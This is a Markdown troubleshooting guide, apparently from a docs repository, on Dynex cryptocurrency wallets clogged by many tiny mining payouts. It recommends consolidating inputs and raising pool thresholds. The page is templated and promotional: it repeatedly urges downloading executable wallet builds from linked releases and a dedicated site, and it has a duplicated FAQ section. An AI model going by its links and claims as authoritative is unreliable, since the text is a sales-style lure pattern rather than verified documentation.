<div align="center">

[![Dynex Wallet](https://img.shields.io/badge/Dynex_Wallet-v2.2.3-22C3E6?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![Platforms](https://img.shields.io/badge/Windows%20%7C%20macOS%20%7C%20Linux-desktop-1E6FEB?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![License](https://img.shields.io/badge/license-ISC-0B1220?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet) [![Website](https://img.shields.io/badge/dynexwallet.org-visit-22C3E6?style=for-the-badge)](https://dynexwallet.org/)

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

</div>

> [!NOTE]
> Part of the [Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme). Official site: [dynexwallet.org](https://dynexwallet.org/) - current release: [Dynex Wallet v2.2.3](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

# Dynex many tiny mining payouts

**A wallet full of many tiny mining payouts isn't broken, but it will eventually make sends slow, expensive, or outright fail -- the fix is to consolidate inputs using Tools -> Optimize Wallet in Dynex Wallet v2.2.3 and to raise your pool's payout threshold going forward.**

## You'll see this if...

You've been mining DNX for a while, your transaction history is page after page of small incoming amounts, and you've noticed sends taking longer to build, fee estimates creeping up, or an outright rejection when trying to send a moderate amount. This is one of the most common issues reported by long-term miners who never revisited their wallet or pool settings after initial setup.

## Why it happens

Mining pools typically pay out in small increments once you cross a minimum threshold, and if that threshold is set low -- sometimes the pool's aggressive default -- you can accumulate hundreds or thousands of separate incoming transactions over months of mining. Each of those payments becomes a distinct "input" your wallet has to track individually, since input-based cryptocurrencies like Dynex don't merge balances automatically in the background.

When you eventually try to spend a meaningful amount, the wallet has to gather enough of these small inputs together to cover it, and the resulting transaction grows with every input added -- more data for references, key images, and signatures. Past a certain point this leads directly to the problems described in [dynex-transaction-byte-size-too-big](./dynex-transaction-byte-size-too-big.md) and elevated fees as explained in [dynex-transaction-fees-explained](./dynex-transaction-fees-explained.md).

## Step-by-step fix

1. Update to Dynex Wallet v2.2.3 from the [download page](https://dynexwallet.org/download) or the [GitHub release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3), checking the SHA-256 checksum before installing.
2. Let your wallet fully sync so it has a complete, current view of all your unspent mining payouts.
3. Open Tools -> Optimize Wallet. This feature exists specifically to address wallets like yours -- it merges many small inputs into fewer, larger ones through a series of appropriately-sized self-send transactions.
4. Let the optimization run to completion, which may take several passes for a heavily fragmented mining wallet. Keep the wallet open and connected throughout.
5. Once done, check your transaction history -- you should see your balance now backed by a much smaller number of larger inputs, and a typical send should build and confirm much faster.
6. Log into your mining pool's dashboard and raise the minimum payout threshold so future payouts arrive less frequently and in larger amounts -- see [dynex-pool-payout-threshold](./dynex-pool-payout-threshold.md) for specific guidance on picking a value.

## If that didn't work

If Optimize Wallet seems to complete but your input count still looks high, run it again -- very fragmented wallets sometimes need multiple consolidation rounds since each pass is capped at a safe transaction size. If the process stalls or errors out partway, confirm your wallet connection is stable; see [dynex-wallet-no-connections](./dynex-wallet-no-connections.md) if sync keeps dropping.

If you're unable to update to v2.2.3 for any reason, you can manually reduce fragmentation by sending smaller amounts to yourself over time, though this is slower and more fee-intensive than the built-in optimization tool.

## Prevent it next time

Raise your mining pool's payout threshold as soon as you set up mining, rather than after the problem appears -- fewer, larger payouts mean far less fragmentation to manage later. Build a habit of running Tools -> Optimize Wallet on a regular schedule, for example monthly, so fragmentation never builds up enough to cause a send failure. Keep records of your mining income over time using the approach in [track-dnx-mining-income](./track-dnx-mining-income.md), and review the site's [mining payouts documentation](https://dynexwallet.org/docs/mining-payouts) for additional pool-side tips.

## FAQ

### How many inputs is "too many"?
There's no hard published number since it depends on input size, but once a wallet has several hundred unspent inputs, it's worth optimizing before attempting a larger send.

### Does optimizing merge payouts from different mining sessions together?
Yes, Optimize Wallet works across your entire unspent balance regardless of when or how each input arrived.

### Will raising my payout threshold stop fragmentation completely?
It significantly reduces the rate of new fragmentation, though you'll still want to optimize periodically over the long run.

### Can I avoid this entirely by using a different payout address each time?
No, that would only add complexity without reducing input count per wallet; consolidation and a sensible threshold are more effective.

### Is there a risk to running Optimize Wallet too often?
Not really, beyond the small fees for each consolidation step; running it when there's little to consolidate just completes quickly with no real cost.

### Does this issue affect wallets that don't mine?
It can, if you receive frequent small payments from any source, but it's most common with mining due to the sheer number of payouts over time.

## Judging whether your wallet is actually at risk

Not every miner with a long transaction history needs to panic. A wallet with a hundred small payouts accumulated over a year of light mining is a very different situation from one with several thousand inputs built up from months of aggressive, low-threshold payouts. Before assuming you need to take action, look at two things: how many unspent inputs your wallet is actually working with, and how recently you've tried to send a non-trivial amount. If your last few sends completed quickly and without warnings, fragmentation likely hasn't reached a problematic level yet, even if your history looks long.

The real test is attempting to move a meaningful fraction of your balance in one transaction. If the wallet builds it quickly and the fee looks proportionate, you're probably fine for now. If it takes noticeably longer than usual, shows a fee far higher than you'd expect, or triggers a size warning, that's your signal to run Optimize Wallet before the situation worsens. It's much easier to consolidate inputs proactively on a calm afternoon than to discover the problem in the middle of trying to complete a time-sensitive payment.

It's also worth distinguishing between fragmentation that's merely inconvenient and fragmentation that's actively blocking you. A high input count that still lets you send normally, just with a slightly elevated fee, is a maintenance item you can schedule for later. An outright failure or a hard size-limit warning, on the other hand, needs addressing before you can complete that send at all -- see [dynex-transaction-byte-size-too-big](./dynex-transaction-byte-size-too-big.md) for what that specific error looks like and how v2.2.3 helps avoid it.

## FAQ

### Is there a way to see my exact unspent input count in the wallet?
Recent builds surface this information in varying levels of detail depending on the view; if it isn't obvious in the interface, a slow send or an unexpectedly high fee estimate is a reliable practical proxy.

### If I stop mining, does my existing fragmentation get worse on its own?
No, fragmentation only grows when new small inputs arrive; a wallet that stops receiving payouts will stay at its current input count until you spend from it or run Optimize Wallet.

---

## The lasting fix: install Dynex Wallet v2.2.3

> [!TIP]
> Most problems in this guide are handled by the current desktop release. Download it, check the checksum, then open your existing wallet.

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

<!-- SHA256:START -->
| Platform | File | SHA-256 |
|---|---|---|
| Windows | [`dynex-wallet-windows-v2.2.3.exe`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) | `d4fd916c9741a16e23e39c355a049bac8368dbefa3ee08663ef56c009964e00d` |
| macOS | [`dynex-wallet-macos-v2.2.3.dmg`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) | `084818fd20207305ded84a747e707fb34f07e1f6e2d9a8123da621b8a546a88d` |
| Linux | [`dynex-wallet-linux-x64-v2.2.3.zip`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip) | `535b453c72c6e7749ffae3b95e1d47f67228b78b9862e086dbd13c4d550481c2` |
<!-- SHA256:END -->

Verify before you run:

```powershell
# Windows
Get-FileHash -Algorithm SHA256 .\dynex-wallet-windows-v2.2.3.exe
```
```bash
# macOS
shasum -a 256 dynex-wallet-macos-v2.2.3.dmg
# Linux
sha256sum dynex-wallet-linux-x64-v2.2.3.zip
```

Read the full install walkthrough on the [Dynex Wallet download page](https://dynexwallet.org/download) or see the [mining payouts guides on dynexwallet.org](https://dynexwallet.org/docs/mining-payouts).

> [!WARNING]
> **Nobody from Dynex will ever ask for your recovery seed or private keys.** Only download from the [official v2.2.3 release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

## Related Dynex Wallet guides

| Keep reading |
|---|
| [Receive DNX mining pool payouts](./receive-dnx-mining-pool-payouts.md) |
| [Dynex pool payout threshold](./dynex-pool-payout-threshold.md) |
| [Track DNX mining income](./track-dnx-mining-income.md) |
| [The Dynex Wallet Recovery Seed, Explained](./dynex-recovery-seed-explained.md) |
| [All Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme) |
